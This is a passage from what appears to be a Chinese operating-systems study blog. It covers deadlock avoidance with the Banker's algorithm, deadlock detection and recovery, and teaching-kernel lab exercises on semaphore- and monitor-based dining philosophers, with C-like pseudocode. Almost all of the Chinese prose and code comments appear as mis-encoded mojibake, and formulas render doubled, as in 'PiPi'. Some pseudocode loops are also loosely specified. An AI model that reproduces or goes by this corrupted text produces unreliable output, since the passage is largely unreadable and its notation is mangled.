Avoidanceï¼‰ï¼šåœ¨ä½¿ç”¨å‰è¿›è¡Œåˆ¤æ–­ï¼Œåªå…è®¸ä¸ä¼šå‡ºç°æ­»é”çš„è¿›ç¨‹è¯·æ±‚èµ„æºã€‚</p></blockquote><p>åˆ©ç”¨é¢å¤–çš„å…ˆéªŒä¿¡æ¯ï¼Œåœ¨åˆ†é…èµ„æºæ—¶åˆ¤æ–­æ˜¯å¦ä¼šå‡ºç°æ­»é”ï¼Œåªåœ¨ä¸ä¼šå‡ºç°æ­»é”æ—¶åˆ†é…èµ„æºã€‚</p><ul><li>è¦æ±‚è¿›ç¨‹å£°æ˜éœ€è¦èµ„æºçš„<strong>æœ€å¤§æ•°ç›®</strong>ã€‚</li><li>é™å®š<strong>æä¾›</strong>ä¸<strong>åˆ†é…</strong>çš„èµ„æºæ•°é‡ï¼Œç¡®ä¿æ»¡è¶³è¿›ç¨‹çš„<strong>æœ€å¤§</strong>éœ€æ±‚ã€‚</li><li><strong>åŠ¨æ€æ£€æŸ¥</strong>èµ„æºåˆ†é…çŠ¶æ€ï¼Œç¡®ä¿ä¸ä¼šå‡ºç°ç¯å½¢ç­‰å¾…ã€‚</li></ul><p>ç³»ç»Ÿèµ„æºåˆ†é…çš„å®‰å…¨çŠ¶æ€</p><ul><li>å½“è¿›ç¨‹è¯·æ±‚èµ„æºæ—¶ï¼Œç³»ç»Ÿåˆ¤æ–­åˆ†é…åæ˜¯å¦å¤„äºå®‰å…¨çŠ¶æ€ã€‚</li><li>ç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ï¼šé’ˆå¯¹æ‰€æœ‰å·²å ç”¨è¿›ç¨‹ï¼Œå­˜åœ¨å®‰å…¨åºåˆ—</li><li>åºåˆ—&lt;P1,P2,â€¦,PN&gt;æ˜¯å®‰å…¨çš„<ul><li>PiPiè¦æ±‚çš„èµ„æº &lt;= å½“å‰å¯ç”¨èµ„æº + æ‰€æœ‰PjPjæŒæœ‰èµ„æºã€‚å…¶ä¸­<code>j&lt;i</code>ã€‚</li><li>å¦‚æœPiPiçš„èµ„æºè¯·æ±‚ä¸èƒ½é©¬ä¸Šåˆ†é…ï¼Œåˆ™PiPiç­‰å¾…æ‰€æœ‰Pj(j&lt;i)Pj(j&lt;i)å®Œæˆ</li><li>PiPiå®Œæˆåï¼ŒPi+1Pi+1å¯å¾—åˆ°æ‰€éœ€èµ„æºï¼Œæ‰§è¡Œå¹¶é‡Šæ”¾æ‰€åˆ†é…çš„èµ„æºã€‚</li><li>æœ€ç»ˆæ•´ä¸ªåºåˆ—çš„æ‰€æœ‰PiPiéƒ½èƒ½è·å¾—æ‰€éœ€èµ„æºã€‚</li></ul></li></ul><p><strong>é“¶è¡Œå®¶ç®—æ³•</strong>ï¼ˆBankerâ€™s Algorithmï¼‰</p><blockquote><p>é“¶è¡Œå®¶ç®—æ³•æ˜¯ä¸€ä¸ªé¿å…æ­»é”äº§ç”Ÿçš„ç®—æ³•ï¼Œä»¥é“¶è¡Œå€Ÿè´·åˆ†é…ç­–ç•¥ä¸ºåŸºç¡€ï¼Œåˆ¤æ–­å¹¶ä¿è¯ç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ã€‚</p></blockquote><ul><li><p>ä½¿ç”¨çš„æ•°æ®ç»“æ„</p><blockquote><p>n = çº¿ç¨‹æ•°é‡ï¼Œ m = èµ„æºç±»å‹æ•°é‡</p></blockquote><ul><li>**Max(æ€»éœ€æ±‚é‡)**ï¼šn x m çŸ©é˜µï¼Œçº¿ç¨‹TiTiæœ€å¤šè¯·æ±‚ç±»å‹RiRiçš„èµ„æºMax[i,j]Max[i,j]ä¸ªå®ä¾‹</li><li>**Available(å‰©ä½™ç©ºé—²é‡)**ï¼šé•¿åº¦ä¸ºmçš„å‘é‡ï¼Œå½“å‰æœ‰Available[i]Available[i]ä¸ªç±»å‹RjRjçš„èµ„æºå®ä¾‹å¯ç”¨</li><li>**Allocation(å·²åˆ†é…é‡)**ï¼šn x m çŸ©é˜µï¼Œçº¿ç¨‹TiTiå½“å‰åˆ†é…äº†Allocation[i,j]Allocation[i,j]ä¸ªRjRjçš„å®ä¾‹</li><li>**Need(æœªæ¥éœ€è¦é‡)**ï¼š n x mçŸ©é˜µï¼Œçº¿ç¨‹TiTiæœªæ¥éœ€è¦Need[i,j]Need[i,j]ä¸ªRjRjèµ„æºå®ä¾‹ã€‚</li></ul><blockquote><p>Need[i,j]=Max[i,j]âˆ’Allocation[i,j]Need[i,j]=Max[i,j]âˆ’Allocation[i,j]</p></blockquote></li><li><p><strong>å®‰å…¨çŠ¶æ€åˆ¤æ–­</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPY<span class="hljs-comment">// Workå’ŒFinishåˆ†åˆ«æ˜¯é•¿åº¦ä¸ºmå’Œnçš„å‘é‡åˆå§‹åŒ–</span><br>Work[m], Finish[n];<br><br>Work = Available; <span class="hljs-comment">// å½“å‰èµ„æºå‰©ä½™ç©ºé—²é‡</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>  Finish[i] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// çº¿ç¨‹iæ²¡ç»“æŸ</span><br><br><span class="hljs-comment">// ...æ¯ä¸ªçº¿ç¨‹å¼€å§‹è¿è¡Œå¹¶åˆ†é…èµ„æº</span><br><br><span class="hljs-comment">// åœ¨ä¸€æ®µæ—¶é—´å</span><br><span class="hljs-comment">// å¯»æ‰¾Needæ¯”Workå°ï¼ŒåŒæ—¶è¿˜æœªç»“æŸçš„çº¿ç¨‹Ti</span><br><span class="hljs-keyword">while</span>(Finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Need[i] &lt;= Work)<br>&#123;<br>    <span class="hljs-comment">// çº¿ç¨‹içš„èµ„æºéœ€æ±‚é‡å°äºå½“å‰å‰©ä½™ç©ºé—²èµ„æºé‡ï¼Œæ‰€ä»¥è¯¥çº¿ç¨‹å¯ä»¥æ­£å¸¸ç»“æŸï¼Œå¹¶å›æ”¶è¯¥çº¿ç¨‹çš„æ‰€æœ‰èµ„æº</span><br>    Work += Allocation[i];<br>    Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">// å¦‚æœæ‰€æœ‰çº¿ç¨‹Tiéƒ½æ»¡è¶³Finish[i] == true,åˆ™ç³»ç»Ÿå¤„äºå®‰å…¨çŠ¶æ€ã€‚</span><br><span class="hljs-keyword">if</span>(Finish == <span class="hljs-literal">true</span>)<br>    Safe;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// åä¹‹ï¼Œç³»ç»Ÿå¤„äºä¸å®‰å…¨çŠ¶æ€ã€‚</span><br>    NoSafe;<br></code></pre></div></td></tr></table></figure></li><li><p>é“¶è¡Œå®¶ç®—æ³•å…·ä½“è®¾è®¡</p><ul><li><p>åˆå§‹åŒ–ï¼šRequest_iï¼šçº¿ç¨‹TiTiçš„èµ„æºè¯·æ±‚å‘é‡ï¼Œ Requesti[j]Requesti[j]ï¼šçº¿ç¨‹TiTiè¯·æ±‚èµ„æºRjRjçš„å®ä¾‹</p></li><li><p>å¾ªç¯ï¼š</p><ol><li><p>å¦‚æœRequesti&lt;=Need[i]Requesti&lt;=Need[i]ï¼Œåˆ™è½¬åˆ°æ­¥éª¤2ã€‚å¦åˆ™æ‹’ç»èµ„æºç”³è¯·ï¼Œå› ä¸ºçº¿ç¨‹å·²ç»è¶…è¿‡äº†å…¶æœ€å¤§èµ„æºè¦æ±‚ã€‚</p></li><li><p>å¦‚æœRequesti&lt;=Availableï¼Œè½¬åˆ°æ­¥éª¤3ã€‚å¦åˆ™ï¼ŒTiå¿…é¡»ç­‰å¾…ï¼Œå› ä¸ºèµ„æºä¸å¯ç”¨ã€‚</p></li><li><p>é€šè¿‡å®‰å…¨çŠ¶æ€åˆ¤æ–­æ¥ç¡®å®šæ˜¯å¦åˆ†é…èµ„æºç»™Ti</p><ul><li><p>ç”Ÿæˆä¸€ä¸ªéœ€è¦åˆ¤æ–­çŠ¶æ€æ˜¯å¦å®‰å…¨çš„èµ„æºåˆ†é…ç¯å¢ƒ</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPYAvailable = Available - Request_i;<br>Allocation[i] = Allocation[i] + Request_i;<br>Need[i] = Need[i] - Request_i;<br></code></pre></div></td></tr></table></figure></li><li><p>å¹¶è°ƒç”¨ä¸Šæ–‡çš„<strong>å®‰å…¨çŠ¶æ€åˆ¤æ–­</strong></p><ul><li>å¦‚æœè¿”å›ç»“æœæ˜¯<strong>å®‰å…¨</strong>ï¼Œåˆ™å°†èµ„æºåˆ†é…ç»™TiTi</li><li>å¦‚æœè¿”å›ç»“æœæ˜¯<strong>ä¸å®‰å…¨</strong>ï¼Œç³»ç»Ÿä¼šæ‹’ç»TiTiçš„èµ„æºè¯·æ±‚</li></ul></li></ul></li></ol></li></ul></li></ul><h5 id="3-æ­»é”æ£€æµ‹å’Œæ¢å¤"><a href="#3-æ­»é”æ£€æµ‹å’Œæ¢å¤" class="headerlink" title="3) æ­»é”æ£€æµ‹å’Œæ¢å¤"></a>3) æ­»é”æ£€æµ‹å’Œæ¢å¤</h5><blockquote><p>æ­»é”æ£€æµ‹å’Œæ¢å¤ï¼ˆDeadlock Detection &amp; Recoveryï¼‰ : åœ¨æ£€æµ‹åˆ°è¿è¡Œç³»ç»Ÿè¿›å…¥æ­»é”çŠ¶æ€åè¿›è¡Œæ¢å¤ã€‚</p></blockquote><ul><li>ç‰¹ç‚¹<ul><li>å…è®¸ç³»ç»Ÿè¿›å…¥æ­»é”çŠ¶æ€</li><li>ç»´æŠ¤ç³»ç»Ÿçš„èµ„æºåˆ†é…å›¾</li><li>å®šæœŸè°ƒç”¨æ­»é”æ£€æµ‹ç®—æ³•æ¥æœç´¢å›¾ä¸­æ˜¯å¦å­˜åœ¨æ­»é”</li><li>å‡ºç°æ­»é”æ—¶ï¼Œç”¨æ­»é”æ¢å¤æœºåˆ¶è¿›è¡Œæ¢å¤ã€‚</li></ul></li></ul><h6 id="i-æ­»é”æ£€æµ‹"><a href="#i-æ­»é”æ£€æµ‹" class="headerlink" title="i. æ­»é”æ£€æµ‹"></a>i. æ­»é”æ£€æµ‹</h6><ul><li><p>æ•°æ®ç»“æ„</p><ul><li>**Available(å‰©ä½™ç©ºé—²é‡)**ï¼šé•¿åº¦ä¸ºmçš„å‘é‡ï¼Œæ¯ç§ç±»å‹å¯ç”¨èµ„æºçš„æ•°é‡</li><li>**Allocation(å·²åˆ†é…é‡)**ï¼šn x m çŸ©é˜µï¼Œå½“å‰åˆ†é…ç»™å„ä¸ªè¿›ç¨‹æ¯ç§ç±»å‹èµ„æºçš„æ•°é‡ï¼Œè¿›ç¨‹PiPiæ‹¥æœ‰èµ„æºRiRiçš„Allocation[i,j]Allocation[i,j]ä¸ªå®ä¾‹ã€‚</li></ul></li><li><p>æ­»é”æ£€æµ‹ç®—æ³•</p><blockquote><p>è¯¥ç®—æ³•ä¸é“¶è¡Œå®¶ç®—æ³•ç±»ä¼¼ã€‚</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">COPY<span class="hljs-comment">// Workå’ŒFinishåˆ†åˆ«æ˜¯é•¿åº¦ä¸ºmå’Œnçš„å‘é‡åˆå§‹åŒ–</span><br>Work[m], Finish[n];<br><br>Work = Available; <span class="hljs-comment">// å½“å‰èµ„æºå‰©ä½™ç©ºé—²é‡</span><br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>    <span class="hljs-comment">// å¦‚æœå½“å‰éå†åˆ°çš„çº¿ç¨‹å ç”¨èµ„æºï¼Œåˆ™è®¾ç½®Finishä¸ºfalse</span><br>    <span class="hljs-comment">// åä¹‹ï¼Œå¦‚æœå½“å‰çº¿ç¨‹ä¸å ç”¨èµ„æºï¼Œåˆ™è¦ä¹ˆæ˜¯çº¿ç¨‹å·²ç»“æŸï¼Œè¦ä¹ˆæ˜¯æˆ‘ä»¬ä¸å…³å¿ƒçš„çº¿ç¨‹</span><br>    <span class="hljs-keyword">if</span>(Allocation[i] &gt; <span class="hljs-number">0</span>)<br>      Finish[i] = <span class="hljs-literal">false</span>; <span class="hljs-comment">// çº¿ç¨‹iæ²¡ç»“æŸ</span><br>    <span class="hljs-keyword">else</span><br>      Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-comment">// ...æ¯ä¸ªçº¿ç¨‹å¼€å§‹è¿è¡Œå¹¶åˆ†é…èµ„æº</span><br><br><span class="hljs-comment">// åœ¨ä¸€æ®µæ—¶é—´å</span><br><span class="hljs-comment">// å¯»æ‰¾Requestæ¯”Workå°ï¼ŒåŒæ—¶è¿˜æœªç»“æŸçš„çº¿ç¨‹Ti</span><br><span class="hljs-keyword">while</span>(Finish[i] == <span class="hljs-literal">false</span> &amp;&amp; Request[i] &lt;= Work)<br>&#123;<br>    <span class="hljs-comment">// çº¿ç¨‹içš„èµ„æºéœ€æ±‚é‡å°äºå½“å‰å‰©ä½™ç©ºé—²èµ„æºé‡ï¼Œæ‰€ä»¥è¯¥çº¿ç¨‹å¯ä»¥æ­£å¸¸ç»“æŸï¼Œå¹¶å›æ”¶è¯¥çº¿ç¨‹çš„æ‰€æœ‰èµ„æº</span><br>    Work += Allocation[i];<br>    Finish[i] = <span class="hljs-literal">true</span>;<br>&#125;<br><span class="hljs-comment">// å¦‚æœæ‰€æœ‰çº¿ç¨‹Tiéƒ½æ»¡è¶³Finish[i] == true,åˆ™ç³»ç»Ÿå¤„äºæ­£å¸¸çŠ¶æ€</span><br><span class="hljs-keyword">if</span>(Finish == <span class="hljs-literal">true</span>)<br>    NoDeadlock;<br><span class="hljs-keyword">else</span><br>    <span class="hljs-comment">// åä¹‹ï¼Œç³»ç»Ÿå¤„äºæ­»é”çŠ¶æ€ã€‚</span><br>    Deadlock;<br></code></pre></div></td></tr></table></figure></li><li><p>æ­»é”æ£€æµ‹ç®—æ³•çš„ä½¿ç”¨</p><ul><li>æ­»é”æ£€æµ‹çš„æ—¶é—´å’Œå‘¨æœŸé€‰æ‹©ä¾æ®<ul><li>æ­»é”å¤šä¹…å¯èƒ½ä¼šå‘ç”Ÿ</li><li>å¤šå°‘è¿›ç¨‹éœ€è¦è¢«å›æ»š</li></ul></li><li>èµ„æºå›¾å¯èƒ½æœ‰å¤šä¸ªå¾ªç¯ï¼Œéš¾ä»¥åˆ†è¾¨â€é€ æˆâ€œæ­»é”çš„å…³é”®è¿›ç¨‹</li></ul></li></ul><h6 id="ii-æ­»é”æ¢å¤"><a href="#ii-æ­»é”æ¢å¤" class="headerlink" title="ii. æ­»é”æ¢å¤"></a>ii. æ­»é”æ¢å¤</h6><ul><li>è¿›ç¨‹ç»ˆæ­¢<ul><li>ç»ˆæ­¢æ‰€æœ‰çš„æ­»é”çº¿ç¨‹</li><li>ä¸€æ¬¡åªç»ˆæ­¢ä¸€ä¸ªè¿›ç¨‹ç›´åˆ°æ­»é”æ¶ˆé™¤</li><li>ç»ˆæ­¢è¿›ç¨‹çš„é¡ºåºåº”è¯¥æ˜¯<ul><li>è¿›ç¨‹çš„ä¼˜å…ˆçº§: é€šå¸¸æ˜¯ä¼˜å…ˆçº§ä½çš„</li><li>è¿›ç¨‹å·²è¿è¡Œæ—¶é—´ä»¥åŠè¿˜éœ€è¿è¡Œæ—¶é—´: å¸Œæœ›è¿è¡Œæ—¶é—´çŸ­çš„</li><li>è¿›ç¨‹å·²å ç”¨èµ„æº: å ç”¨èµ„æºå°‘çš„</li><li>è¿›ç¨‹å®Œæˆéœ€è¦çš„èµ„æº</li><li>ç»ˆæ­¢è¿›ç¨‹æ•°ç›®: è‡ªç„¶æ˜¯è¶Šå°è¶Šå¥½</li><li>è¿›ç¨‹æ˜¯äº¤äº’å¼è¿˜æ˜¯æ‰¹å¤„ç†: é€šå¸¸æ˜¯ç”¨æˆ·äº¤äº’è¿›ç¨‹</li></ul></li></ul></li><li>èµ„æºæŠ¢å <ul><li>é€‰æ‹©è¢«æŠ¢å è¿›ç¨‹ï¼šæœ€å°æˆæœ¬ç›®æ ‡</li><li>è¿›ç¨‹å›é€€ï¼šè¿”å›åˆ°ä¸€äº›å®‰å…¨çŠ¶æ€ï¼Œé‡å¯è¿›ç¨‹åˆ°å®‰å…¨çŠ¶æ€</li><li>å¯èƒ½ä¼šå‡ºç°é¥¥é¥¿ï¼šåŒä¸€ä¸ªè¿›ç¨‹å¯èƒ½ä¸€ç›´è¢«é€‰ä½œè¢«æŠ¢å è€…</li></ul></li></ul><h2 id="ç»ƒä¹ -4"><a href="#ç»ƒä¹ -4" class="headerlink" title="ç»ƒä¹ "></a>ç»ƒä¹ </h2><h3 id="ç»ƒä¹ 1-4"><a href="#ç»ƒä¹ 1-4" class="headerlink" title="ç»ƒä¹ 1"></a>ç»ƒä¹ 1</h3><blockquote><p>ç†è§£å†…æ ¸çº§ä¿¡å·é‡çš„å®ç°å’ŒåŸºäºå†…æ ¸çº§ä¿¡å·é‡çš„å“²å­¦å®¶å°±é¤é—®é¢˜</p></blockquote><p>ä¿¡å·é‡çš„å®ç°åœ¨çŸ¥è¯†ç‚¹ä¸­æœ‰åˆ†æ. è¿™é‡Œå†™å“²å­¦å®¶å°±é¤é—®é¢˜æ£€æŸ¥å‡½æ•°çš„å®ç°å’Œä¿¡å·é‡çš„è”ç³».</p><p>åœ¨kern\sync\check_sync.cä¸­æœ‰check_sync()å‡½æ•°, åˆ†ä¸ºä½¿ç”¨ ä¿¡å·é‡çš„æ£€æŸ¥ ä»¥åŠ ç®¡ç¨‹çš„æ£€æŸ¥, æ‹¿å‰è€…è¯´æ˜, è¯¥ç§æ£€æŸ¥è°ƒç”¨<code>sem_init(&amp;mutex, 1)</code>åˆå§‹åŒ–mutex, éœ€è¦è®¾ç½®ä¸‹é¢è¿™å‡ ä¸ªå˜é‡å­˜å‚¨å¿…è¦ä¿¡æ¯. </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> state_sema[N]; <span class="hljs-comment">/* è®°å½•æ¯ä¸ªäººçŠ¶æ€çš„æ•°ç»„ */</span><br><span class="hljs-keyword">semaphore_t</span> mutex; <span class="hljs-comment">/* ä¸´ç•ŒåŒºäº’æ–¥ */</span><br><span class="hljs-keyword">semaphore_t</span> s[N]; <span class="hljs-comment">/* æ¯ä¸ªå“²å­¦å®¶ä¸€ä¸ªä¿¡å·é‡, è¡¨ç¤ºæ˜¯å¦å¾—åˆ°äº†å‰å­ */</span><br></code></pre></div></td></tr></table></figure><p>ç„¶ååˆ›å»ºäº”ä¸ªå†…æ ¸çº¿ç¨‹, çº¿ç¨‹è°ƒç”¨çš„å‡½æ•°ä¸ºphilosopher_using_[semaphore, monitor], è¿›å…¥ä¸€ä¸ªæ€»å…±4æ¬¡çš„å¾ªç¯. </p><p>æ¯æ¬¡å¾ªç¯å°±æ˜¯é‡å¤æ€è€ƒ, å–å‰, è¿›é¤, æ”¾å‰å‡ ä¸ªåŠ¨ä½œ, æ¨¡æ‹Ÿè¿›ç¨‹ä½¿ç”¨èµ„æºçš„å‡ ç§æ“ä½œ.</p><p>æ¯”å¦‚å–å‰ä¼šè°ƒç”¨<code>phi_take_forks_sema()</code>å‡½æ•°, </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">phi_take_forks_sema</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i)</span> <span class="hljs-comment">/* iï¼šå“²å­¦å®¶å·ç ä»0åˆ°N-1 */</span></span><br><span class="hljs-function"></span>&#123; <br>        down(&amp;mutex); <span class="hljs-comment">/* è¿›å…¥ä¸´ç•ŒåŒº */</span><br>        state_sema[i]=HUNGRY; <span class="hljs-comment">/* è®°å½•ä¸‹å“²å­¦å®¶ié¥¥é¥¿çš„äº‹å® */</span><br>        phi_test_sema(i); <span class="hljs-comment">/* è¯•å›¾å¾—åˆ°ä¸¤åªå‰å­ */</span><br>        up(&amp;mutex); <span class="hljs-comment">/* ç¦»å¼€ä¸´ç•ŒåŒº */</span><br>        down(&amp;s[i]); <span class="hljs-comment">/* å¦‚æœå¾—ä¸åˆ°å‰å­å°±é˜»å¡ */</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>è¿™æ˜¯ä¸€ä¸ªäº’æ–¥çš„èµ„æºè¯·æ±‚, <del>æˆ‘è®¤ä¸ºè¯¥å‡½æ•°å¯ä»¥ç†è§£ä¸ºè¿™å°±ç›¸å½“äºè¿›ç¨‹ä½¿ç”¨ä¸€ç§ç³»ç»Ÿè°ƒç”¨, åœ¨æ“ä½œç³»ç»Ÿå±‚é¢è¿›è¡Œè¿›å…¥å’Œç¦»å¼€ä¸´ç•ŒåŒºçš„æ“ä½œ.</del> ==å¥½å§ä¿¡å·é‡è¿™ç§æ–¹æ³•å…¶å®æ˜¯éœ€è¦ç¨‹åºå‘˜å†™å‡ºæ¥çš„.==</p><ul><li>å…ˆæ˜¯ä¸´ç•ŒåŒºäº’æ–¥ä¿¡å·é‡mutexçš„Pæ“ä½œ(å®ç°åœ¨çŸ¥è¯†ç‚¹2é‡Œ), åŒä¸€æ—¶é—´åªèƒ½æœ‰ä¸€ä¸ªå“²å­¦å®¶è¿›å…¥ä¸´ç•ŒåŒº</li><li>ç„¶åè¯•å›¾å¾—åˆ°ä¸¤åªå‰å­è¿˜è¦æŸ¥çœ‹å·¦è¾¹å³è¾¹å“²å­¦å®¶æ˜¯å¦åœ¨EATINGçŠ¶æ€, å¾—åˆ°äº†å°±è¿›è¡Œè¯¥å“²å­¦å®¶ä¿¡å·é‡s[i]çš„Væ“ä½œ, è¡¨ç¤ºå–åˆ°äº†å‰å­</li><li>æœ€åä¸€å¥å°±æ˜¯å¦‚æœæ²¡å–åˆ°å‰å­åˆè¿›è¡Œäº†Pæ“ä½œ, è¿™æ—¶å€™è‚¯å®šå°±é˜»å¡äº†, è¿™æ—¶å€™ä¼šè¿›è¡Œschedule(), åˆ‡æ¢åˆ°å…¶ä»–è¿›ç¨‹<ul><li>è¿™ä¸€æ­¥æœ‰ç‚¹ç‰¹åˆ«, å› ä¸ºè¦åœ¨ä¸´ç•ŒåŒºå†…è¿›è¡Œä¸€æ¬¡Væ“ä½œ, ç„¶ååœ¨å¤–é¢è¿›è¡Œä¸€æ¬¡Pæ“ä½œæ£€æŸ¥åˆšåˆšæ˜¯å¦è¿›è¡Œäº†Væ“ä½œ.</li></ul></li></ul><p>å¦‚æœæœ‰å…¶ä»–å“²å­¦å®¶ä½¿ç”¨Væ“ä½œé‡Šæ”¾äº†å‰å­, å°±ä¼šè°ƒç”¨wakeup_wait()æ¥ä½¿è¯¥ä¿¡å·é‡çš„ç­‰å¾…é˜Ÿåˆ—é‡Œçš„ç¬¬ä¸€ä¸ªå˜æˆRUNNALBLE, æ‰€æœ‰ä½¿ç”¨è¿™ç§èµ„æºçš„è¿›ç¨‹åªæœ‰è¿™ä¸ªèƒ½å°±ç»ª, å¦‚æœè°ƒåº¦å™¨è°ƒåº¦åˆ°äº†è¿™ä¸ªè¿›ç¨‹å°±å¯ä»¥ç»§ç»­è¿›è¡Œäº†.</p><p>æ¥ä¸‹æ¥è¿›é¤sleep 10ä¸ªæ—¶é—´ç‰‡, ç„¶ååˆ°äº†æ”¾ä¸‹å‰å­. è¿™æ—¶å€™<strong>éœ€è¦ç¨‹åºå‘˜æ¸…æ¥šåœ°çŸ¥é“</strong>æ”¾ä¸‹åéœ€è¦è¿›è¡Œçš„æ“ä½œ, è¿™é‡Œæ˜¯æ£€æŸ¥å·¦å³é‚»åº§æ˜¯å¦åœ¨HUNGRYçŠ¶æ€, æ˜¯çš„è¯å…è®¸ä»–æ‹¿èµ·å‰å­(é€šè¿‡<code>up(&amp;s[i])</code>).</p><p>å¤§æ¦‚çš„è¿‡ç¨‹å°±æ˜¯è¿™æ ·.</p><h3 id="ç»ƒä¹ 2-4"><a href="#ç»ƒä¹ 2-4" class="headerlink" title="ç»ƒä¹ 2"></a>ç»ƒä¹ 2</h3><blockquote><p>å®Œæˆå†…æ ¸çº§æ¡ä»¶å˜é‡å’ŒåŸºäºå†…æ ¸çº§æ¡ä»¶å˜é‡çš„å“²å­¦å®¶å°±é¤é—®é¢˜, å†…æ ¸çº§æ¡ä»¶å˜é‡çš„è®¾è®¡æè¿°</p></blockquote><p>ç®¡ç¨‹é‡Œçš„å…¨å±€å˜é‡:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">int</span> state_condvar[N];                            <span class="hljs-comment">// the philosopher&#x27;s state: EATING, HUNGARY, THINKING  </span><br><span class="hljs-keyword">monitor_t</span> mt, *mtp=&amp;mt;                          <span class="hljs-comment">// monitor</span><br></code></pre></div></td></tr></table></figure><p>è€Œmonitoræ˜¯è¿™æ ·çš„(é‡å¤äº†ä¸€ä¸‹ä¸Šé¢çš„):</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">monitor</span>&#123;</span><br>    <span class="hljs-keyword">semaphore_t</span> mutex;<span class="hljs-comment">// the mutex lock for going into the routines in monitor, should be initialized to 1</span><br>    <span class="hljs-comment">// the next semaphore is used to </span><br>    <span class="hljs-comment">//    (1) procs which call cond_signal funciton should DOWN next sema after UP cv.sema</span><br>    <span class="hljs-comment">// OR (2) procs which call cond_wait funciton should UP next sema before DOWN cv.sema</span><br>    <span class="hljs-keyword">semaphore_t</span> next;        <br>    <span class="hljs-keyword">int</span> next_count;         <span class="hljs-comment">// the number of of sleeped procs which cond_signal funciton</span><br>    <span class="hljs-keyword">condvar_t</span> *cv;          <span class="hljs-comment">// the condvars in monitor</span><br>&#125; <span class="hljs-keyword">monitor_t</span>;<br></code></pre></div></td></tr></table></figure><p>å¤§è‡´æµç¨‹è·Ÿä¸Šé¢å·®ä¸å¤š, åœ¨ç®¡ç¨‹å†…éƒ¨è®¾ç½®äº†cvæ•°ç»„æ¥è®°å½•æ˜¯å¦æ‹¿åˆ°äº†å‰å­, cond_signalå’Œcond_waitçš„åŸç†å’Œå®ç°åœ¨çŸ¥è¯†ç‚¹ä¸­.</p><div style="display: none;"><ul><li><p>ç®¡ç¨‹ç”±ä¸€ä¸ªé”å’Œå¤šä¸ªæ¡ä»¶å˜é‡ç»„æˆï¼Œä»¥ä¸‹æ˜¯ç®¡ç¨‹å’Œæ¡ä»¶å˜é‡çš„ç»“æ„ä½“ä»£ç </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span 